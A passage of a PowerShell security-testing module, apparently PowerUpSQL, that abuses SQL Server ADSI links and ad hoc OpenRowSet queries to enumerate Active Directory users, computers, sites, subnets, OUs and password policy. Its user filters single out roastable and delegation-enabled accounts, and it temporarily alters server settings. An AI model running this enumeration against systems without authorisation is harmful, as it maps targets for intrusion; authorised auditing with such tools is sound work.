            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Sysadmin: Yes"
            }
        }          

        # When the following conditions are met stop, because it won't work
        # sysadmin (implicit at this point in the code) + type sql login + no adhoc or provided link cred        
        if ($SQLCurrentLogin -notlike "*\*")
        {
            if(($UseAdHoc) -or ($LinkPassword)){
                # note
            }else{
                Write-Verbose -Message "$Instance : A SQL Login with sysadmin privileges cannot execute ASDI queries through a linked server by itself."
                Write-Verbose -Message "$Instance : Try one of the following:"
                Write-Verbose -Message "$Instance :  - Run the command again with the -UseAdHoc flag "
                Write-Verbose -Message "$Instance :  - Run the command again and provide -LinkUser and -LinkPassword"
                return
            }
        }
        
        # Setup the LDAP Path
        if(-not $LdapPath ){
            $LdapPath = $DomainName
        }

        # Check if adsi is installed and can run in process
        $CheckEnabled = Get-SQLOleDbProvder -Instance $Instance -Username $Username -Password $Password -SuppressVerbose | Where ProviderName -like "ADsDSOObject" | Select-Object AllowInProcess -ExpandProperty AllowInProcess
        if ($CheckEnabled -ne 1){
            Write-Verbose -Message "$Instance : ADsDSOObject provider allowed to run in process: No"
            Write-Verbose -Message "$Instance : The ADsDSOObject provider is not allowed to run in process. Stopping operation."
            return
        }else{
            Write-Verbose -Message "$Instance : ADsDSOObject provider allowed to run in process: Yes"
        }

        # Determine query type
        if($UseAdHoc){
            If (-not($SuppressVerbose)){                

                if ($SQLCurrentLogin -like "*\*"){
                    Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as '$SQLCurrentLogin'."
                }else{
                    if(-not $LinkUsername){
                        Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as the SQL Server service account ($ServiceAccount)."
                    }else{
                        Write-Verbose -Message "$Instance : Executing in AdHoc mode using OpenRowSet as '$LinkUsername'."
                    }
                }
            }
        }else{
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Executing in Link mode using OpenQuery."
            }
        }

        # Create ADSI Link (if link)
        if(-not $UseAdHoc){

            # Create Random Name
            $RandomLinkName = (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}))                                

            # Status user
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Creating ADSI SQL Server link named $RandomLinkName."
            }

            # Create Link
            $QueryCreateLink = "
            
            -- Create SQL Server link to ADSI
            IF (SELECT count(*) FROM master..sysservers WHERE srvname = '$RandomLinkName') = 0
	            EXEC master.dbo.sp_addlinkedserver @server = N'$RandomLinkName', 
	            @srvproduct=N'Active Directory Service Interfaces', 
	            @provider=N'ADSDSOObject', 
	            @datasrc=N'adsdatasource'
                
            ELSE
	            SELECT 'The target SQL Server link already exists.'"

            # Run query to create link
            $QueryCreateLinkResults = Get-SQLQuery -Instance $Instance -Query $QueryCreateLink -Username $Username -Password $Password -Credential $Credential -ReturnError
           
            # Associate login with the link
            if(($LinkUsername) -and ($LinkPassword)){

                # Status user
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Associating login '$LinkUsername' with ADSI SQL Server link named $RandomLinkName."
                }

                $QueryAssociateLogin = "

                EXEC sp_addlinkedsrvlogin 
                @rmtsrvname=N'$RandomLinkName',
                @useself=N'False',
                @locallogin=NULL,
                @rmtuser=N'$LinkUsername',
                @rmtpassword=N'$LinkPassword'"                                           

            }else{

                # Status user
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Associating '$SQLCurrentLogin' with ADSI SQL Server link named $RandomLinkName."
                }

                $QueryAssociateLogin = "
                -- Current User Context
                -- Notes: testing tbd, sql login (non sysadmin), sql login (sysadmin), windows login (nonsysadmin), windows login (sysadmin), - test passthru and provided creds 
                EXEC sp_addlinkedsrvlogin 
                @rmtsrvname=N'$RandomLinkName',
                @useself=N'True',
                @locallogin=NULL,
                @rmtuser=NULL,
                @rmtpassword=NULL"
            }                                

            # Run query to associate login with link
            Get-SQLQuery -Instance $Instance -Query $QueryAssociateLogin -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 

        }        

        # Enable AdHoc Queries (if adhoc and required)
        if($UseAdHoc){
            
            # Get current state
            $Original_State_ShowAdv = Get-SQLQuery -Instance $Instance -Query "SELECT value_in_use FROM master.sys.configurations WHERE name like 'show advanced options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object value_in_use -ExpandProperty value_in_use
            $Original_State_AdHocQuery = Get-SQLQuery -Instance $Instance -Query "SELECT value_in_use FROM master.sys.configurations WHERE name like 'Ad Hoc Distributed Queries'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object value_in_use -ExpandProperty value_in_use

            # Enable 'Show Advanced Options'
            if($Original_State_ShowAdv -eq 0){
                
                # Execute Query
                Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                  

                # Status user
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Enabling 'Show Advanced Options'"
                }
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : 'Show Advanced Options' is already enabled"
                }
            }

            # Enable 'Ad Hoc Distributed Queries'
            if($Original_State_AdHocQuery -eq 0){               

                # Execute Query
                Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                

                # Status user
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : Enabling 'Ad Hoc Distributed Queries'"
                }
            }else{
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message "$Instance : 'Ad Hoc Distributed Queries' are already enabled"
                }
            }
        }

        # SetUp LDAP Query
        if($UseAdHoc){

            # Define adhoc query auth
            if(($LinkUsername) -and ($LinkPassword)){
                $AdHocAuth = "User ID=$LinkUsername; Password=$LinkPassword;"                
            }else{
                $AdHocAuth = "adsdatasource" 
            }

            # Define adhoc query
            $Query = "
            -- Run with credential in syntax option 1 - works as sa
            SELECT *
            FROM OPENROWSET('ADSDSOOBJECT','$AdHocAuth',
            '<LDAP://$LdapPath>;$LdapFilter;$LdapFields;subtree')"
        }else{

            # Define link query
            $Query  = "SELECT * FROM OpenQuery($RandomLinkName,'<LDAP://$LdapPath>;$LdapFilter;$LdapFields;subtree')"                 
        }                        
        
        # Display TSQL Query
        # Write-verbose "Query: $Query"
            
        # Status user
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$Instance : LDAP query against logon server using ADSI OLEDB started..."
        }        

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential

        # Add results to table
        $TblDomainObjects += $TblResults         
        
        # Remove ADSI Link (if Link)
        if(-not $UseAdHoc){
            
            # Status user
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Removing ADSI SQL Server link named $RandomLinkName"
            }

            # Setup query to remove link
            $RemoveLinkQuery = "EXEC master.dbo.sp_dropserver @server=N'$RandomLinkName', @droplogins='droplogins'"

            # Run query to remove link
            $RemoveLinkQueryResults = Get-SQLQuery -Instance $Instance -Query $RemoveLinkQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        }

        # Restore AdHoc State (if adhoc)
        if($UseAdHoc){
            
            # Status user
            If (-not($SuppressVerbose)){
                Write-Verbose -Message "$Instance : Restoring AdHoc settings if needed."
            }
            
            # Restore ad hoc queries    
            Get-SQLQuery -Instance $Instance -Query "sp_configure 'Ad Hoc Distributed Queries',$Original_State_AdHocQuery;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        

            # Restore Show advanced options
            Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',$Original_State_ShowAdv;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose              
        }

        # Status user
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$Instance : LDAP query against logon server using ADSI OLEDB complete."
        } 
    }

    End
    {
        # Return record count
        $RecordCount = $TblDomainObjects.Row.count

        # Status user
        If (-not($SuppressVerbose)){
            Write-Verbose -Message "$Instance : $RecordCount records were found."
        } 

        # Return records
        return $TblDomainObjects
    }
}

Function  Get-SQLDomainUser
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Filter users based on state or property settings.')]
        [ValidateSet("All","Enabled","Disabled","Locked","PwNeverExpires","PwNotRequired","PreAuthNotRequired","SmartCardRequired","TrustedForDelegation","TrustedToAuthForDelegation","PwStoredRevEnc")]
        [String]$UserState,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain user to filter for.')]
        [string]$FilterUser,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Only list the users who have not changed their password in the number of days provided.')]
        [Int]$PwLastSet,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup user filter
        if((-not $FilterUser)){
            $FilterUser = '*'
        }

        # Setup user state / property filter
        if((-not $PwLastSet)){
            $PwLastSetFilter = ""
        }else{

            # Get number of days from user and convert to timestamp
            $DesiredTimeStamp = (Get-Date).AddDays(-$PwLastSet).ToFileTime()

            # Use timestamp to create filter to only list the users who have not changed their password in the number of days provided.
            $PwLastSetFilter = "(!pwdLastSet>=$DesiredTimeStamp)"
        }

        # Setup user state filter
        switch ($UserState)
        {
            "All"                         {$UserStateFilter = ""} 
            "Enabled"                     {$UserStateFilter = "(!userAccountControl:1.2.840.113556.1.4.803:=2)"} 
            "Disabled"                    {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=2)"} 
            "Locked"                      {$UserStateFilter = "(sAMAccountType=805306368)(lockoutTime>0)"}
            "PwNeverExpires"              {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=65536)"} 
            "PwNotRequired"               {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=32)"}
            "PwStoredRevEnc"              {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=128)"}
            "PreAuthNotRequired"          {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"}
            "SmartCardRequired"           {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=262144)"}
            "TrustedForDelegation"        {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"}
            "TrustedToAuthForDelegation"  {$UserStateFilter = "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"}
        }
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields "samaccountname,name,admincount,whencreated,whenchanged,adspath" -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields "samaccountname,name,admincount,whencreated,whenchanged,adspath"          
        }
    }

    End
    {                                       
    }
}


Function  Get-SQLDomainSubnet
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Get the domain of the server
        if($TargetDomain)
        {
            $Domain = $TargetDomain
        }else{
            $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | Select-Object DomainName -ExpandProperty DomainName
        }
        $DomainDistinguishedName = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields 'distinguishedname' -UseAdHoc | Select-Object distinguishedname -ExpandProperty distinguishedname
        
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=subnet)" -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields 'name,distinguishedname,siteobject,whencreated,whenchanged,location' -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=subnet)" -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields 'name,distinguishedname,siteobject,whencreated,whenchanged,location'          
        }
    }

    End
    {
    }
}


Function  Get-SQLDomainSite
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Get the domain of the server
        if($TargetDomain)
        {
            $Domain = $TargetDomain
        }else{
            $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | Select-Object DomainName -ExpandProperty DomainName
        }
        $DomainDistinguishedName = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields 'distinguishedname' -UseAdHoc | Select-Object distinguishedname -ExpandProperty distinguishedname
        
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=site)" -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields 'name,distinguishedname,whencreated,whenchanged' -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(objectCategory=site)" -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields 'name,distinguishedname,whencreated,whenchanged'          
        }
    }

    End
    {
    }
}


Function  Get-SQLDomainComputer
{
    <#
            .SYNOPSIS
            Using the OLE DB ADSI provider, query Active Directory for a list of domain computers
            via the domain logon server associated with the SQL Server.  This can be 
            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
            flag to switch between modes.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER LinkUsername
            Domain account used to authenticate to LDAP through SQL Server ADSI link.
            .PARAMETER LinkPassword
            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
            .PARAMETER UseAdHoc
            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER TargetDomain
            Domain to query.
            .PARAMETER FilterComputer
            Domain computer to filter for.
            .EXAMPLE
            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
            .EXAMPLE
            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
          .EXAMPLE
            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose 
            .EXAMPLE
            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainComputer -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain computer to filter for.')]
        [string]$FilterComputer,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup computer filter
        if((-not $FilterComputer)){
            $FilterComputer = '*'
        }
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath' -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields 'samaccountname,dnshostname,operatingsystem,operatingsystemversion,operatingSystemServicePack,whencreated,whenchanged,adspath'            
        }
    }

    End
    {
    }
}

Function  Get-SQLDomainOu
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectCategory=organizationalUnit)' -LdapFields 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged' -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectCategory=organizationalUnit)' -LdapFields 'name,distinguishedname,adspath,instancetype,whencreated,whenchanged'
        }
    }

    End
    {                                           
    }
}


Function  Get-SQLDomainAccountPolicy
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,


        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Create table for results
        $TableAccountPolicy = New-Object System.Data.DataTable 
        $TableAccountPolicy.Columns.Add("pwdhistorylength") | Out-Null
        $TableAccountPolicy.Columns.Add("lockoutthreshold") | Out-Null
        $TableAccountPolicy.Columns.Add("lockoutduration") | Out-Null
        $TableAccountPolicy.Columns.Add("lockoutobservationwindow") | Out-Null
        $TableAccountPolicy.Columns.Add("minpwdlength") | Out-Null 
        $TableAccountPolicy.Columns.Add("minpwdage") | Out-Null
        $TableAccountPolicy.Columns.Add("pwdproperties") | Out-Null
        $TableAccountPolicy.Columns.Add("whenchanged") | Out-Null
        $TableAccountPolicy.Columns.Add("gplink") | Out-Null
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectClass=domainDNS)' -LdapFields 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink' -UseAdHoc            
        }else{
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter '(objectClass=domainDNS)' -LdapFields 'pwdhistorylength,lockoutthreshold,lockoutduration,lockoutobservationwindow,minpwdlength,minpwdage,pwdproperties,whenchanged,gplink'
        }

        $Results | ForEach-Object {

            # Add results to table
            $TableAccountPolicy.Rows.Add(
            $_.pwdHistoryLength,
            $_.lockoutThreshold,
            [string]([string]$_.lockoutDuration -replace '-','') / (60 * 10000000),
            [string]([string]$_.lockOutObservationWindow -replace '-','') / (60 * 10000000),
            $_.minPwdLength,
            [string][Math]::Floor([decimal](((([string]$_.minPwdAge -replace '-','') / (60 * 10000000)/60))/24)),
            [string]$_.pwdProperties,
            [string]$_.whenChanged,
            [string]$_.gPLink 
            ) | Out-Null

        }

        $TableAccountPolicy
    }

    End
    {                     
    }
}

Function  Get-SQLDomainGroup
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$FilterGroup,

        [Parameter(Mandatory = $false,
